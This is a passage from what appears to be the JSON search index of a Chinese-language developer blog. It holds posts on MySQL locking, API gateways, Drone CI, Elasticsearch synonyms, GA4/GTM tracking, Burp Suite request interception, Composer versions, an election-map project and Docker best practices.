","permalink":"http://shachiku.life/2022/07/8-fallacies-of-distributed-computing/","summary":"設計分散式系統時須具備的基礎思考要點","title":"[推薦]分布式系統的 8 個謬誤"},{"contents":"Source 過早最佳化是萬惡的根源\nSummary 這篇文章非常經典，每隔一段時間拿出來看都有不同感受，核心觀念可以套用在任何地方。 以寫 code 舉例，假如一開始就直接用 laravel 開發且僅鑽研它，那路就被自己走窄了，可能影響到的層面就是抽換工作的機會成本\n","permalink":"http://shachiku.life/2022/07/premature-optimization-is-the-root-of-all-evil/","summary":"過早最佳化是萬惡的根源","title":"[推薦] 過早最佳化是萬惡的根源"},{"contents":"Source https://yuanchieh.page/posts/2022/2022-04-25-mysqllock-%E8%88%87-index-%E9%97%9C%E4%BF%82%E5%92%8C-deadlock-%E5%88%86%E6%9E%90/\nSummary index 會造成寫入效能下降（lock），使用時須謹慎評估 先篩選出 pk(fk) 後再使用他們避免 gap lock（不要用 where pk \u0026gt; ?） 沒特別狀況就使用 Read Committed，因預設的 Repeatable Read 在執行 update 時會把所有的 where 條件都 lock 起來，而 RC 只要條件不符就會 release 可以使用 use index 決定要使用的 index，8.0 之後排序才有意義 Main idea 首先點出結論再依照不同類型的 index 套入 isolation level 介紹順序、gap lock 是如何造成 dead lock 的，最後給予幾點建議\n","permalink":"http://shachiku.life/2022/07/mysql-lock-index-and-deadlock/","summary":"lock is a good thing","title":"[推薦] Mysql Lock Index and Deadlock"},{"contents":"Source https://www.youtube.com/watch?v=vHQqQBYJtLI\nSummary Separate out cross cutting concerns: 把非 api 不需要關注的邏輯（ssl, 驗證, logging…）分離 Separate and consolidate cross cutting concerns across microservices: 路徑 proxy Replacing multiple client calls with single API call. And, some features of reverse proxy: 靜態檔案與 http cache Routing based on headers, paths and params etc. And, some features of Load Balancer Main idea 以購物車為情境，分別羅列出對應的 component 與ssl、驗證分別需要用到的地方，再將 api gateway 放入此情境中描述其用途。\n大整體而言是 nginx 層，其背後概念與 middleware 相似，都是攔截 request 作處理。\n自架服務有 apache, haproxy, nginx, spring cloud gateway，雲端服務有 AWS API gateway, Azure API gateway, Google Cloud Endpoints, Apigee 等\nReference cross cutting concerns\n","permalink":"http://shachiku.life/2022/06/what-is-api-gateway/","summary":"gateway is a good thing","title":"[推薦] What Is Api Gateway"},{"contents":"最近比較閒，想開啟一個逼自己閱讀的方式：找出個人認為值得閱讀的文章，做出重點摘要，順便嘗試看看原子習慣的法則。\n結構會由 source、summary以及 main idea 組成方便閱讀與回顧。\n靈感來源是 灣區日報，能持續多久就是多久，作為終身學習的一個表徵～\nSource https://vkhorikov.medium.com/dont-mock-your-database-it-s-an-implementation-detail-8f1b527c78be\nSummary mock 的本質是在撰寫測試時模擬無法控制的服務或以產出為主的類別，比如 SMTP、金流、queue、command 等， 其他可控的服務或獲取為主的類別如 database、shopping cart、query 等應使用 stub 進行測試撰寫。在撰寫程式時考慮物件本身是屬於 inter 或 intra level 的 service，搭配 DI 模式可以更好地寫出 testable 的程式。\nMain idea 在撰寫測試時經常會需要模擬假物件（mock）或假資料（stub），stub 比較容易理解，mock 則需釐清場景。本文首先提出撰寫測試時進行模擬的名詞提出解釋，分別是\ntest double: 在撰寫測試時假物件/假資料的總稱 mock: 完整物件，通常由 framework 中包含的 library 提供 spy: 部份物件，與 mock 相同，通常需自行實作 dummy: 完全寫死的假資料 stub: 比 dummy 更加完整的假資料，會因 input 變更 output fake: 同 stub，差別在於尚未實作 再依 outcoming/incoming，command/query，inter/intra的角度分別解釋 mock 與 stub 的差異，最後依 dependency 的角度總結出該使用 mock 的情境\n","permalink":"http://shachiku.life/2022/06/mock-database-or-not/","summary":"mock is a good thing","title":"[推薦] Mock Database or Not"},{"contents":"最近幫公司串 instagram 的功能，因其屬於 facebook，所以要走他的審查，送了好幾次終於過了，紀錄一下撰寫要點\n影片可以只上傳一份，除非要求的權限要做的事在系統上差異較大再分開傳\n影片另外放 youtube 並提供連結\n有串接的應用程式也提供測試帳號：比如說功能是登入系統後可以取得個人的 instagram 資料，那就提供「系統登入帳號」以及「instagram 登入帳號」\n站在系統的角度描述用途，如下\n本系統為 XXXXXX，該平台近期將上線「透過 instagram 進行個人相簿匯入」的功能，因此需要能取得 instagram 用戶的個人資料以及塗鴉牆多媒體資料進行匯入 使用情境如下 1. 登入系統 2. 點選「透過 ig 匯入」 3. 取得 ig 資料後點選圖片 4. 點擊上傳按鈕 影片連結： \u0026lt;youtube link\u0026gt; 驗證方式如下： 網址：https://www.example.com/my-system 帳號：test@example.com 密碼：test123456 Instagram 帳密 test_ig@example.com xxxxxxxx 審查速度還挺快的，前前後後 5 共 3 天，主要是要讓審查人員可以對系統作出影片的事情就好～\n","permalink":"http://shachiku.life/2022/03/instagram-application-review/","summary":"真的很麻煩","title":"Facebook 應用程式審查要點"},{"contents":"雖然想怎麼站都沒問題，不過滑一滑突然烙個英文好像可以感覺比較專業\n這邊簡單介紹一下滑板的四種站位專有名詞\n版頭（nose）版尾（tail） 有幾種分辨方法\n看圖案：依照閱讀順序，左-\u0026gt;右、上-\u0026gt;下 = 頭-\u0026gt;尾 看砂（貼）紙 用長短跟平緩程度：一般來說比較平且短是板尾，翹且高是板頭 上方板頭，下方板尾 regular \u0026amp; goofy 對頭尾有認知後，才能介紹這兩種腳位\nregular：左腳在頭 goofy：右腳在頭，原因是大家都認識的迪士尼角色—高飛 Goofy surfing 各種站位 正腳正滑（normal） 後腳踩板尾，前腳踩板頭後方，朝板頭滑行 正腳反滑（fakie） 同上，朝板尾滑行 反腳正滑（switch） regular\u0026lt;-\u0026gt;goofy，朝板頭滑行 反腳反滑（nollie） 同上，朝板尾滑行，或是 normal 腳位往前跨一小步，前腳踩到板頭即可 學會一些術語後，去板場烙英文將不再尷尬\n","permalink":"http://shachiku.life/2021/11/skateboard-stance/","summary":"滑不好沒關係，要講的很專業","title":"Skateboard 各種站位"},{"contents":"設置 trigger 前往你的 GTM 管理平台點擊 trigger 頁籤，新增 trigger\n有許多不同種類的 trigger 可以設定，這裡列舉 click 事件的 url 和 element 的 trigger 作為範例\n以 link 為主，且 path 為 tags/.\u0026#43; 以 element 為主，id 等於 switch_theme 此外還有 page view、user engagement 以及其他還無法歸納的類型可以使用，可依照自己的需求決定要埋設的類型 trigger\n設置 tag 並綁定 trigger 新增 tag 綁定 trigger tag type 選擇 GA4 Event Configuration Tag 選擇 Google Analytics GA4 Configuration 定義要顯示到 GA console 的 event_name 綁定對應的 trigger 設定完畢後先 preview，確定有效果再 submit（做版控）\n檢驗結果 前往 GA console，過一段時間在 Engagement::Events 畫面就能看到自訂義事件的結果摟 額外設定的 switch_theme 事件呈現在 console 上 補充 regex 不熟悉的話可以到 https://regex101.com/ 或是 https://ihateregex.io/ 先找到 pattern，再貼回來\n","permalink":"http://shachiku.life/2021/09/setup-custom-event-tracking-to-ga-via-gtm/","summary":"埋了 GTM 卻不用客製化 event，履歷上敢寫你會 GTM？","title":"透過 GTM 綁定客製事件到 GA4"},{"contents":"很久以前用過，紀錄一下怎麼做竄改封包找漏洞\nOWASP ZAP 也可以做到\nlocal env 關閉 proxy 攔截 確認攔截器已關閉 確認 proxy port 並設定為 loopback 確認 proxy 設定正確 設定 browser proxy 在瀏覽器的設定直接改 進行攔截 other env 透過 burp suite 開啟瀏覽器輸入要攔截的網址 點擊 open browser 進行攔截 Cloud CDN 獨立於 GKE 之外 針對 request 竄改封包 每按一次 forward 就會讓網站繼續往下個 request跑\n跑到要竄改的 request 時針對回應進行竄改 竄改完畢後按 forward 即可 ","permalink":"http://shachiku.life/2021/08/tamper-packet-using-burp-suite/","summary":"改封包 94 這麼簡單","title":"使用 Burp Suite 進行封包竄改"},{"contents":"在 composer.json 經常看到 caret(^) 跟 tilde(~) 開頭的套件版號，雖然很少會遇到需要調整的情況但有需要都會忘記，紀錄一下不然每次都要查\n先講結論 Always use caret(^) instead of tilde(~) npm is in the same rule 細節 一般情況 # ~ ~1.0 means \u0026gt;=1.0.0 \u0026lt;2.0.0 same as 1.* ~1.0.0 means \u0026gt;=1.0.0 \u0026lt;1.1.0 same as 1.0.* # ^ ^1.0 means \u0026gt;=1.0.0 \u0026lt;2.0.0 same as 1.* ^1.0.0 means \u0026gt;=1.0.0 \u0026lt;2.0.0 same as 1.* 特殊情況 版號為 0.y.z 的狀況：依照語意化版號的標準，在 0.y.z 時都算是 under development，不應被視為 stable\n# Might break backward compatibility ~0.2 means \u0026gt;=0.2.0 \u0026lt;1.0.0 # This is fine ~1.2 means \u0026gt;=1.2.0 \u0026lt;2.0.0 # workaround 0.2.* means \u0026gt;=0.2.0 \u0026lt;0.3.0 # Solve it in simple way ^0.2 means \u0026gt;=0.2.0 \u0026lt;0.3.0 Reference composer version constraints semver ","permalink":"http://shachiku.life/2021/08/tilde-vs-caret-in-composer/","summary":"^ vs ~","title":"Tilde(~) vs Caret(^) in composer"},{"contents":"久聞 Drone CI 的大名卻一直沒理解過，剛好公司裡面用的 CICD tool 是 Drone～趕緊玩玩看\noverview overview drone 官方直接整合多樣 VCS，透過 webhook 的方式把各種 event 推給 drone-server，server 再去調用 drone-runner 執行各種命令，最後部署出去\ndrone 有提供各種不同的 server 與 runner，選擇自己適合的即可，這邊用 github + docker 當範例\ninstallation GitHub 設定 建立 OAuth app oauth app landing page 設定基本資料，ngrok 是好東西 記得複製 ID 與 SECRET\n建立 repo 與設定 webhook 設定基本資料，ngrok 是好東西 於 repo 根目錄放 .drone.yml\n--- kind: pipeline type: docker name: default steps: - name: backend image: golang commands: - go build - go test when: branch: - main - name: frontend image: node commands: - npm install - npm test when: branch: - main - name: publish image: plugins/docker settings: repo: whchi/drone-example registry: index.docker.io - name: try image: busybox commands: - cat README.md # 2021-07-22 只支援很早之前的 integration，紀錄當下並未支援現有 slack 版本 # 依照官方文件操作才能正確安裝 - name: notify image: plugins/slack settings: webhook: https://hooks.slack.com/services/... channel: your-channel-name when: status: [success, failure] drone 設定 .env DRONE_GITHUB_CLIENT_ID=your_github_oauth_app_client_id DRONE_GITHUB_CLIENT_SECRET=your_github_oauth_app_client_secret DRONE_RPC_SECRET=random_string DRONE_RPC_HOST=drone-server DRONE_SERVER_PROTO=http DRONE_SERVER_HOST=your_hostname DRONE_SERVER_HOST 必須要和在 github 上面的一致，如果你用 ngork 的話就是 xxxx.ngrok.io\ndocker-compose.yml version: 3.9 services: drone-server: image: drone/drone restart: always ports: - 8080:80 volumes: - drone:/var/lib/drone restart: always env_file: - ./.env container_name: local_drone_server drone-runner: image: drone/drone-runner-docker restart: always volumes: - /var/run/docker.sock:/var/run/docker.sock depends_on: - drone-server env_file: - ./.env container_name: local_drone_runner volumes: drone: 測試 登入 drone-server 於瀏覽器輸入 domain enable repo for drone 修改 repo 以觸發 build 修改後觸發的 build log dashboard 這樣就是設定完成拉～剩下的就看你的 repo 要用哪種 runner 跟 pipeline 調整～\n範例都放在我的 github 上提供參考\nReferences https://readme.drone.io/ https://readme.drone.io/pipeline/overview/ ","permalink":"http://shachiku.life/2021/07/drone-ci-installation/","summary":"（偽）無人機體驗心得","title":"玩玩 Drone CI"},{"contents":" Originally published at https://medium.com/cw-it-group on Jan 15, 2020. 原文網址 天下雜誌於 2020 年總統大選期間推出總統大選專題，技術承接自 2018 年九合一選舉地圖，以此為基礎推出即時開票與翻盤地圖、成效出乎意料的機器人分析和即時更新文章的記者深度分析等頁面。這次有幸參與這個專案，學了不少東西，趁還沒忘記趕緊紀錄下來。\n使用的資料來源與技術 資料來源：中選會、財政部、內政部、氣象局（是的你沒看錯）\n資料處理：php、python、nodejs、QGIS（處理 shp 檔，後面說明）\n視覺呈現：d3.js、jQuery（不潮但很好用）\nInfra：Google Cloud Platform\n資料獲取 選舉資料：歷年選舉資料從中選會開放資料庫取得，即時開票資料似乎只有媒體業才有權限申請api，投開票所資料麻…一個一個找摟 人口統計資料、收入資料：社會經濟資料庫 縣市鄉鎮村里代碼對應資料：內政部戶政司 地理圖資：社會經濟資料庫人口統計資料有提供 shp 檔 資料清整 這個步驟毫不意外地投入了最多時間，不得不說中選會的資料有些地方真的蠻弔詭，大部分的區域會提供 pdf 以及 ods，pdf 有所屬村里可是 ods 裡面卻沒有真的是 what the…\n有沒有業界夥伴想要分享一下心得啊～～\n首先要感謝強大的團隊成員幫忙把歷屆選舉、人口統計與收入資料都先整理過，才能讓我有更多時間運用工人智慧檢查投開票所資料有沒有對錯。\n中選會開票的結果資料是以投開票所為單位，每個投開票所有其所屬村里，因此計算時要把結果跟村里代碼對應表 mapping 後加總才能獲得相對準確的某村里總數據。\n大多數投開票所資料都有提供 pdf 以及 ods 檔，看到 ods 當下心裡想的是「有 ods 耶～so sweet～～～❤」，很快地把 ods 裡的地址擷到村里作為該投開票所所屬村里，人工補上沒有村里的資料後開心的畫了一個地圖，看見台南市滿滿的破洞我就知道出來混總是要還的。\n最後處理的方法是把能夠貼上 gsheet 的 pdf 先貼一次，下載成 csv 再用 vscode 處理；不能貼上的就先買罐眼藥水再開始作業。\n然而這樣做還是會有一些漏掉的部分，所以還要加上中選會在選舉前兩週開放的查詢系統去對。\n過程中最崩潰的是對字，有些是看起來一樣但程式就認為不一樣，比如說「龜壳里」跟「龜壳里」，以及各種工人智慧引發的錯誤。\n人有悲歡離合，村里也有 2016 到 2020 這幾年，村里數從原本約 7840 個下降到 7761 個（還好 2018 到 2020 沒變），那投票率該怎麼處理才不會看起來很怪？我的做法是先產出一份兩個年份村里比對的 csv，再到 2018 年的地圖上一一挑出有變化的村里，依肉眼測量切分比例計算該村里各政黨的得票率占比，這也是為了機器人分析與地圖切換時能正常運作的必要步驟。\n技術介紹 系統架構 Cloud CDN 獨立於 GKE 之外 考慮到流量可能會很大，整體設計架構盡量以靜態為主：全部都丟 GCS，搭配 GKE ingress \u0026amp; nginx proxy 掛靜態檔案，回來吃 cloud cdn，除機器人分析因社群分享需求要走動態渲染之外，其他都是靜態。\n最終額外多開的機器只有兩台：\n常駐的 n1-standard-1（撈深度分析頁資料） 開票時的 n2-highcpu-16 preemptible 拿來畫機器人分享圖跟即時開票資料處理（preemeptible 是先佔型虛擬機，很適合這種類型的專案） 非常感謝強大的 DevOps 團隊快速把架構部署完成，詢問過尖峰時段 pods 數量長到 111 個，nodes 開 21 個。\n繪製地圖 地理圖資可以從社會經濟資料庫的人口統計資料取得 shp 檔，拿到後可以先丟到 mapsharper.org 看看長相，我一開始是拿國土繪測局的開放圖資畫，一畫發現跟 2018 年對不起來，幾經研究才知道 2018 的地圖有特別把離島拉近本島讓前端呈現比較好看，所以另外用 QGIS 對 2016 及 2020 的地圖做相同處理。\n步驟如下：\n選擇 TWD97 格式載入 2016 及 2020 地圖並轉存成 WGS84（2018 是 WGS84），編碼 UTF-8 載入 2018 地圖當作基準，分別載入 2016 及 2020 地圖調整離島位置 另存調整好的地圖為 shp 畫地圖與地圖縮放邏輯沿用之前的，詳細記錄參考 2018 年九合一選舉地圖技術紀錄，圖資整理流程大致如下：\nshp 轉 geojson 開票資料轉 ndjson concat 開票資料與 geojson geojson 轉 topojson 縮小 size 丟給 d3.js 畫 這一系列的動作都是用 nodejs 完成，方法是參考 Mike Bostock 寫的教學。\n記者深度分析 此頁面下方推薦的文章需要即時更新，我又不想為了一次性的活動做後台，幾經思考想到可以用 Google App Script 把 gsheet 的資料轉成 json API，再用排程每分鐘抓取並丟到 GCS 上讓上面的 javacsript 可以隨時讀到最新的 json，同時為了避免快取有加上 timestamp。\n這樣做主要的好處是後端不需特別裝套件也不用多開 service account 就能做到即時更新的效果，是個蠻不錯的方法～\n程式碼的部分可以參考我個人的筆記。\n機器人分析 這頁出乎意料的紅，也許跟今年年輕人高投票率有關，還沒玩過的可以玩玩 https://web.cw.com.tw/2020-taiwan-presidential-election/data.html 資料來源 = 內政部 + 財政部 + 氣象局 + 中選會\n這頁因為有分享到社群的需求要讓 fb/line/twitter 爬蟲能解析 meta，使用已經存在的 laravel site 當後端產出包含 meta 的 page，再用 GKE 的 ingress 把特定路徑 proxy 給他，其他靜態就吃原本 nginx 的 proxy 到 GCS 上。\n圖片的部分是用 python 的 pillow 製作，一個區域要產 4 張（4 種 emoji），再乘上所有區域後總共要產的圖有 30000 多張，這麼大量的產圖不寫平行怎麼對得起自己？？？\n平行化後原本要產 3 小時的圖縮減到只要 25 分鐘真的很有成就感。 分享畫面示意圖，圖片總數為 33320 張 氣象資料抓的是全台各地區天氣觀測預報，但天氣好壞的類別實在太多了，粗略計算就有 100 種左右，討論了一下我寫了一個簡單的判斷：當某些字元組合出時就是不好/好來呈現天氣文案。\nOne more thing 其實這個地圖有顆彩蛋，有閒的人應該會發現～\n有個需求是開票完畢後要提供地圖 svg 給記者們出稿，本著可以增加睡眠時間的目的偷偷做了一個可以自己決定要下載哪個區域或全台地圖 svg 的彩蛋功能。（雖然最後還是天亮了…\n黃色按鈕可以下載縣市/鄉鎮/村里等級的全台地圖，藍色按鈕則是先選擇要下載的區域後，依你點選的區域決定要往下幾個層級抓（比如點擊區域+lv1 ，會抓選擇區域到達鄉鎮層級的 svg），越底層功能越單一。 先開聲音後輸入 konami 的祕技你就可以得到它 關閉彩蛋也很簡單，輸入 gg 即可，沒反應就多按幾次～\n技術方面的紀錄就寫到這，感謝各位。\n","permalink":"http://shachiku.life/2021/07/2020-taiwan-presidential-election-campaign-site-tech-note/","summary":"medium 搬過來的","title":"[From medium]天下雜誌 2020 總統大選專題-技術紀錄"},{"contents":" Originally published at https://medium.com/@whccchi on May 2, 2020. 原文網址 最近幫公司實作自動完成的功能，趁機補了一下相關的基礎知識，寫在這邊跟各位分享，這篇文章提供要使用 Elasticsearch 完成中文同義詞與自動完成所需的最小知識。\n專有名詞 右側是 RDBMS 的名詞，用類比的方式比較有帶入感 其中有幾個概念跟這篇文章比較有關\ndocument 可以被 index 的最小單位。\nsettings 針對某個 index 的 tokenizer、filter、shards、replica…等的設定，可以 update，要先關閉後才能做。\nmappings 定義某個index包含的fields的儲存方式，無法 update，有分靜態和動態，動態是指當有新 field 產生時 Elasticsearch 會嘗試猜測並賦予類型，只支援這幾種類型。\n額外要提的是 type：在 7.0 版本之後預設移除，8.0 則不支援，官方說明原因為其設計理念與 Luence 實際儲存資料的方式有衝突：在 RDBMS 的 context 中，table 之間的 column 不會互相影響，而在 Elasticsearch 對 filed 儲存方式是在同個 index 裡面同名稱的 field 吃同樣的 mapping，跟原本想做到的概念相違。\nindex概念簡介 Inverted Index 也是經過 Analyzer 之後才走 doc 透過 analyzer 處理後儲存成類似圖中的表，搜尋時用 Inverted index 的方法找出其於表中出現的次數，再去推出要找的doc，如圖中輸入”somethin funny” 查找後發現 “something”跟”funny”都有出現在 doc1 中，因此回傳 doc1 作為搜尋結果。\nanalyzer概念簡介 analyzer 由三個部分組成由處理順序左到右如圖，只有 text field 才支援 analyzer 設定。 Character Filter \u0026#43; Tokenizer \u0026#43; Token Filter = Analyzer 輸入字串透過 character filter 把字串的 html tag 去除後經過 whitespace tokenizer 去掉空白字元，最後經過 synonym filter 把同義字替換後再存到Inverted index 中準備提供查詢。\n有了 analyzer 的概念後在設定同義詞時會比較明白在設定的到底是什麼。\n同義詞 這邊使用 ik 分詞器，比較老牌（出問題比較能找到解）的中文分詞器，搭配自定義的字典檔以及同義字字庫就能開始使用，在 analyzer 中是屬於 Tokenizer 的層級。\n範例 字典檔（custom-dict.txt）：讓進去的字不要被切斷，能夠正確被同義字字庫比對。 胃食道逆流 流行性感冒 同義字字庫（synonym.txt） 流感,流行性感冒 胃食道逆流=\u0026gt;胃病 Dockerfile FROM elasticsearch:7.6.2 RUN ./bin/elasticsearch-plugin install -b [https://github.com/medcl/elasticsearch-analysis-ik/releases/download/v7.6.2/elasticsearch-analysis-ik-7.6.2.zip](https://github.com/medcl/elasticsearch-analysis-ik/releases/download/v7.6.2/elasticsearch-analysis-ik-7.6.2.zip) RUN mkdir -p /usr/share/elasticsearch/config/analysis-ik/custom COPY ./dict/custom-dict.txt /usr/share/elasticsearch/config/analysis-ik/custom/custom-dict.dic COPY ./dict/synonym.txt /usr/share/elasticsearch/config/analysis/synonym.txt USER elasticsearch 利用上面這些範例可快速在本地建立一個具有 ik 分詞功能的 elasticsearch，接著在設定 mapping 與 setting\n// PUT /\u0026lt;index\u0026gt; { \u0026#34;mappings\u0026#34;: { \u0026#34;properties\u0026#34;: { \u0026#34;field1\u0026#34;: { \u0026#34;analyzer\u0026#34;: \u0026#34;ik_syno_max\u0026#34;, \u0026#34;search_analyzer\u0026#34;: \u0026#34;ik_syno_smart\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;text\u0026#34; }, \u0026#34;field2\u0026#34;: { \u0026#34;analyzer\u0026#34;: \u0026#34;ik_syno_max\u0026#34;, \u0026#34;search_analyzer\u0026#34;: \u0026#34;ik_syno_smart\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;text\u0026#34; } } }, \u0026#34;settings\u0026#34;: { \u0026#34;analysis\u0026#34;: { \u0026#34;analyzer\u0026#34;: { \u0026#34;ik_syno_smart\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;custom\u0026#34;, \u0026#34;tokenizer\u0026#34;: \u0026#34;ik_smart\u0026#34;, \u0026#34;filter\u0026#34;: [\u0026#34;my_synonym\u0026#34;] }, \u0026#34;ik_syno_max\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;custom\u0026#34;, \u0026#34;tokenizer\u0026#34;: \u0026#34;ik_max_word\u0026#34;, \u0026#34;filter\u0026#34;: [\u0026#34;my_synonym\u0026#34;] } }, \u0026#34;filter\u0026#34;: { \u0026#34;my_synonym\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;synonym\u0026#34;, \u0026#34;synonyms_path\u0026#34;: \u0026#34;analysis/synonym.txt\u0026#34; } } } } } 設定成功的話測試結果如下\n// POST /\u0026lt;index\u0026gt;/_analyze // request { \u0026#34;text\u0026#34;: \u0026#34;流行性感冒\u0026#34;, \u0026#34;analyzer\u0026#34;: \u0026#34;ik_syno_max\u0026#34; } // response { \u0026#34;tokens\u0026#34;: [ { \u0026#34;token\u0026#34;: \u0026#34;流感\u0026#34;, \u0026#34;start_offset\u0026#34;: 0, \u0026#34;end_offset\u0026#34;: 5, \u0026#34;type\u0026#34;: \u0026#34;SYNONYM\u0026#34;, // 同義詞判斷成功 \u0026#34;position\u0026#34;: 0 } ] } 自動完成 官方推薦兩種方式\nCompletion Suggester 回應速度很快，但其資料結構因素只能做到prefix completion。\nsearch-as-you-type （7.2~） 使用 shingle token filter 當作 base，因此可以做到 infix completion，舊的版本可以用 ngram token filter 達到類似效果。\n我最後使用 search-as-you-type，因為這個效果比較符合使用情境，設定步驟如下：\n建立 mapping\n// PUT /\u0026lt;index\u0026gt; { \u0026#34;mappings\u0026#34;: { \u0026#34;properties\u0026#34; : { \u0026#34;completion_field\u0026#34; : { \u0026#34;type\u0026#34; : \u0026#34;search_as_you_type\u0026#34;, \u0026#34;analyzer\u0026#34;: \u0026#34;ik_max_word\u0026#34; } } } } 建立 data\n// PUT /\u0026lt;index\u0026gt;/\u0026lt;id\u0026gt; // request 1 { \u0026#34;completion_field\u0026#34;: \u0026#34;甲狀腺腫大\u0026#34; } // request 2 { \u0026#34;completion_field\u0026#34;: \u0026#34;甲狀腺凸眼症\u0026#34; } ... 測試結果\n// GET /\u0026lt;index\u0026gt;/_search // request { \u0026#34;_source\u0026#34;: [\u0026#34;completion_field\u0026#34;], \u0026#34;query\u0026#34;: { \u0026#34;multi_match\u0026#34;: { \u0026#34;query\u0026#34;: \u0026#34;甲狀\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;best_fields\u0026#34;, // 按照有對應到的順序計算 \u0026#34;fields\u0026#34;: [ \u0026#34;completion_field\u0026#34; ] } } } // response { ... \u0026#34;hits\u0026#34; : { ... \u0026#34;hits\u0026#34; : [ { \u0026#34;_index\u0026#34; : \u0026#34;completion_field\u0026#34;, \u0026#34;_type\u0026#34; : \u0026#34;_doc\u0026#34;, \u0026#34;_id\u0026#34; : \u0026#34;1\u0026#34;, \u0026#34;_score\u0026#34; : 0.8630463, \u0026#34;_source\u0026#34; : { \u0026#34;completion_field\u0026#34; : \u0026#34;甲狀腺腫大\u0026#34; } }, { \u0026#34;_index\u0026#34; : \u0026#34;completion_field\u0026#34;, \u0026#34;_type\u0026#34; : \u0026#34;_doc\u0026#34;, \u0026#34;_id\u0026#34; : \u0026#34;1\u0026#34;, \u0026#34;_score\u0026#34; : 0.8630463, \u0026#34;_source\u0026#34; : { \u0026#34;completion_field\u0026#34; : \u0026#34;甲狀腺凸眼症\u0026#34; } } ] } } 前端隨便找一套看的順眼的 auto-completion library 套一下就好～這邊延用之前同義字的 analyzer，因為這樣自動完成出來的東西才不會被切的很奇怪。\n上面大概說明怎麼快速建立一個具有同義字和自動完成功能的 Elasticsearch node，至於效果好不好得看字庫範圍夠不夠集中且多元，這塊很吃領域知識，這篇文章提供了「有」的部分，要「好」的話還有更多需要做的。\n","permalink":"http://shachiku.life/2021/07/elasticsearch-synonym-and-autocomplete-in-chinese/","summary":"medium 搬過來的","title":"[From medium]Elasticsearch 中文同義詞與自動完成"},{"contents":"Google Analytics(GA) 1. 建立 account 與 property property 建議設定成 hostname\n2. 建立 data stream 照表填寫 data stream 設定 3. copy measurement id copy measurement id Google Tag Manager(GTM) 1. 建立 account 與 container container 建議設定成 hostname\n2. 建立 tag 選擇 GA4 configuration，貼上剛剛複製的 measurement id 3. 貼代碼到你的 site 代碼示意圖 4. 驗證結果 點選 preview 前往驗證 設定網站位置進行驗證 驗證結果-site（需裝套件） 驗證結果-dashboard 然後你就可以跟一般 GA 一樣在後台看到 GA 結果拉～\n補充 GTM vs GA GTM 不是拿來取代 GA 的，他是讓建立 GA tracking code （tag）設定規則、獨立 trigger 更加方便 GTM 是個介於你的網站與 tracking code management 的 middle man，不同的網站需要埋的 event 都可以透過它進行管理 同上，GTM 獨立於 GA 之外，GA 只是眾多 tag 的其中一種，此外你也可以透過 GTM 對 GA 增修進行管理而不需要透過工程師做處理（太過客製化除外） GTM 可以在特殊情況下觸發特定 event，GA 僅是一個全站分析的 tag，比如說：註冊表單送出事件、使用者收藏某篇文章..等 GTM 不能設定 GA goal/conversions GA4 vs old GA(universal analytics) measuring model：GA4 based on events and params, old GA based on sessions and pageviews 免費版取消每月點擊限制：old GA 10m/month, GA4 unlimited GA4 可以免費與 BigQuery 進行串接 放到 hugo 裡面 善用 shortcode 功能，建立一個 tracking.html 埋 GTM\n於放置的地方加入判斷\n{{ if (fileExists \u0026#34;layouts/partials/tracking.html\u0026#34;) }} {{ partial \u0026#34;tracking.html\u0026#34; . }} {{ end }} References https://www.analyticsmania.com/post/google-tag-manager-vs-google-analytics/ https://www.adaptworldwide.com/insights/2021/google-analytics-4-vs-universal-analytics-whats-the-difference ","permalink":"http://shachiku.life/2021/07/setup-ga4-with-gtm/","summary":"寫了 blog 總會想看一下瀏覽數，娛不了人也能自娛","title":"設定 GA4 與 GTM"},{"contents":"之前很無聊在 godaddy 買了一個 domain，試試把它掛進來\nStep1. settings in godaddy 於 godaddy DNS 管理介面的 records 增加與修改設定如下 type name value A @ 185.199.108.153 A @ 185.199.109.153 A @ 185.199.110.153 A @ 185.199.111.153 CNAME www {yourname}.github.io TTL 隨意，可參考 https://www.varonis.com/blog/dns-ttl/\nStep2. setup github page 有兩種設定方式\n程式\n在根目錄增加 CNAME 內容設定為要綁定的網域\nyourdomain.com 如果是用 hugo 架站就增加 static/CNAME\n介面\n於 repository 的 Settings::Pages 底下增加 domain 如圖（實際上他就是把你的根目錄增加 CNAME file） 於 github 介面 domain 設定完之後等 DNS 生效後，就可以用新的 domain 訪問 github page 了\n","permalink":"http://shachiku.life/2021/07/setup-domain-to-your-github-page/","summary":"買了 domain 就是要用","title":"綁定 domain 給 github page"},{"contents":"本文範圍涵蓋建立有效率的 images 的最佳實踐方法\ndocker 透過讀取 Dockerfile 建立 image．其有自訂的規範與指示, 可參考 Dockerfile reference 找到更多解釋\n一個 Docker image 由 多個指令所建構出的 read-only layer 所組成．這些 layer 彼此堆疊，且各 layer 為前一層的 delta of changes．圖為一範例 Dockerfile\nFROM ubuntu:18.04 COPY . /app RUN make /app CMD python /app/app.py 每個指令都建立了一個 layer：\nFROM creates a layer from the ubuntu:18.04 Docker image. COPY adds files from your Docker client’s current directory. RUN builds your application with make. CMD specifies what command to run within the container. 當你 run 一個 container，等同於是在底層的 layer 之上增加了新的 \u0026ldquo;writable layer(container layer)\u0026rdquo;, 所有對 container 的操作，例如檔案異動、新增檔案等都會被寫入這個 layer\n更多關於 image layer 以及 docker 是如何建置與儲存 image 的資訊可參考 storage driver\n一般性指導原則與建議 建立 ephemeral container 在 Dockerfile 的定義所建立的 container 應盡量 \u0026ldquo;ephemeral\u0026rdquo; —可以很容易的被停止、刪除並重建以使用最小設定取代，原因參考 The Twelve-factor App methodology 的 process\n理解 build context 當觸發 docker build 時當下的工作目錄就是所謂的 build context．在預設的情況下會假設當前目錄存在一份 Dockerfile，但也可以透過-f 指令決定要 build 的 Dockefile．不管 Dockerfile 在哪裏，所有在工作目錄底下的檔案與目錄都會作為 build context 送到 docker daemon 裡面，參考範例如下\n# Build context example Create a directory for the build context and cd into it. Write “hello” into a text file named hello and create a Dockerfile that runs cat on it. Build the image from within the build context (.): mkdir myproject \u0026amp;\u0026amp; cd myproject echo \u0026#34;hello\u0026#34; \u0026gt; hello echo -e \u0026#34;FROM busybox\\nCOPY /hello /\\nRUN cat /hello\u0026#34; \u0026gt; Dockerfile docker build -t helloapp:v1 . # Move Dockerfile and hello into separate directories and build a second version of # the image (without relying on cache from the last build). # Use -f to point to the Dockerfile and specify the directory of the build context: mkdir -p dockerfiles context mv Dockerfile dockerfiles 